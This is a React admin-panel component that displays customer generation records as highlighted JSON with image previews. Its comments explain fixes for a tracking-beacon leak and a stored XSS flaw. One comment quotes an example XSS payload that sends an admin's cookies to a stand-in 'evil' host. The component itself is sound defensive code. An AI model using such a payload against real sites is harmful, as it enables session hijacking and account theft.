'use client';

import { useState, type ReactNode } from 'react';
import { Copy, Check, Image as ImageIcon } from 'lucide-react';

interface ExpandableRowProps {
  data: Record<string, unknown>;
  imageUrl?: string | null;
}

/**
 * Only preview images that came out of OUR storage.
 *
 * `data` is the customer's own generation row, and the URL fields inside it are
 * plain `z.string().min(1)` (app/api/studios/edit/route.ts:15,
 * photoshoot/route.ts:16) — strings the customer chose. Rendering one as
 * `<img src>` makes the ADMIN's browser issue the request, handing the customer
 * the admin's IP, User-Agent and the exact moment their account was reviewed.
 * The `onError` handler below then hides the element, so a fired beacon leaves
 * nothing visible in the panel.
 *
 * The old test accepted any host: a trailing image extension, or merely the
 * string containing "supabase" or "storage" anywhere. CSP does not cover this
 * either — `img-src` in next.config.ts still allows the `*.supabase.co`
 * wildcard, and anyone can register a project there and read the hit out of
 * their own logs. Our Supabase is self-hosted, so that wildcard buys nothing.
 *
 * Same rule the server just adopted in lib/storage/export-source.ts: a
 * customer-written URL is never dereferenced unless it is ours.
 */
function isOwnStorageUrl(url: string): boolean {
  const configured = process.env.NEXT_PUBLIC_SUPABASE_URL;
  if (!configured) return false;
  try {
    return new URL(url).origin === new URL(configured).origin;
  } catch {
    return false;
  }
}

function extractImageUrls(obj: unknown): string[] {
  const urls: string[] = [];
  if (typeof obj === 'string' && isOwnStorageUrl(obj)) {
    urls.push(obj);
  } else if (Array.isArray(obj)) {
    obj.forEach(item => urls.push(...extractImageUrls(item)));
  } else if (obj && typeof obj === 'object') {
    Object.values(obj).forEach(val => urls.push(...extractImageUrls(val)));
  }
  return urls;
}

function tokenClass(token: string): string {
  if (token.startsWith('"')) {
    return token.trimEnd().endsWith(':') ? 'text-indigo-600' : 'text-emerald-600';
  }
  if (token === 'true' || token === 'false') return 'text-blue-600';
  if (token === 'null') return 'text-slate-400';
  return 'text-amber-600';
}

/**
 * Colour a JSON dump by returning React nodes, never an HTML string.
 *
 * This used to build `<span class=...>` markup and hand it to
 * dangerouslySetInnerHTML. The tokens come from JSON.stringify of a
 * `generations` row — i.e. the customer's own prompt and the model's reply —
 * and JSON.stringify escapes quotes and backslashes but NOT `<`, `>` or `&`.
 * So a prompt of
 *     <img src=x onerror="fetch('//evil/'+document.cookie)">
 * survived stringify intact, matched the string-token branch, was wrapped in a
 * span and injected as live markup the moment an admin expanded that row in
 * /admin/generations. Stored XSS, authored by any signed-up user, executing in
 * an admin session.
 *
 * React escapes text children, so emitting nodes removes the sink entirely
 * rather than trying to sanitise around it — there is no HTML string to get
 * wrong. Escaping the JSON first would not have worked anyway: it turns `"`
 * into `&quot;` and the tokeniser below stops matching strings.
 */
const JSON_TOKEN =
  /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+-]?\d+)?)/g;

function highlightJson(json: string): ReactNode[] {
  const nodes: ReactNode[] = [];
  const re = new RegExp(JSON_TOKEN.source, 'g');
  let last = 0;
  let match: RegExpExecArray | null;

  while ((match = re.exec(json)) !== null) {
    if (match.index > last) nodes.push(json.slice(last, match.index));
    nodes.push(
      <span key={match.index} className={tokenClass(match[0])}>
        {match[0]}
      </span>
    );
    last = match.index + match[0].length;
    // A zero-length match would spin forever; the alternation can match empty.
    if (match[0].length === 0) re.lastIndex += 1;
  }
  if (last < json.length) nodes.push(json.slice(last));
  return nodes;
}

export default function ExpandableRow({ data, imageUrl }: ExpandableRowProps) {
  const [copied, setCopied] = useState(false);

  const jsonString = JSON.stringify(data, null, 2);
  const images = (imageUrl ? [imageUrl] : extractImageUrls(data)).filter(isOwnStorageUrl);

  function handleCopy() {
    navigator.clipboard.writeText(jsonString);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  return (
    <div className="space-y-3">
      {/* Image previews */}
      {images.length > 0 && (
        <div className="flex flex-wrap gap-2">
          {images.slice(0, 4).map((url, i) => (
            <div key={i} className="relative">
              <div className="flex items-center gap-1 mb-1 text-xs text-slate-500">
                <ImageIcon className="h-3 w-3" />
                Output Preview
              </div>
              {/* eslint-disable-next-line @next/next/no-img-element */}
              <img
                src={url}
                alt="Generation output"
                className="max-w-xs rounded-lg border border-slate-200 shadow-sm"
                onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }}
              />
            </div>
          ))}
        </div>
      )}

      {/* JSON display */}
      <div className="relative">
        <button
          onClick={handleCopy}
          className="absolute right-2 top-2 flex items-center gap-1 rounded-md bg-white/80 px-2 py-1 text-xs text-slate-600 shadow-sm transition-colors hover:bg-white"
        >
          {copied ? <Check className="h-3 w-3 text-emerald-500" /> : <Copy className="h-3 w-3" />}
          {copied ? 'Copied' : 'Copy'}
        </button>
        <pre className="max-h-64 overflow-auto rounded-lg bg-slate-900 p-4 text-xs leading-relaxed text-slate-300">
          {highlightJson(jsonString)}
        </pre>
      </div>
    </div>
  );
}
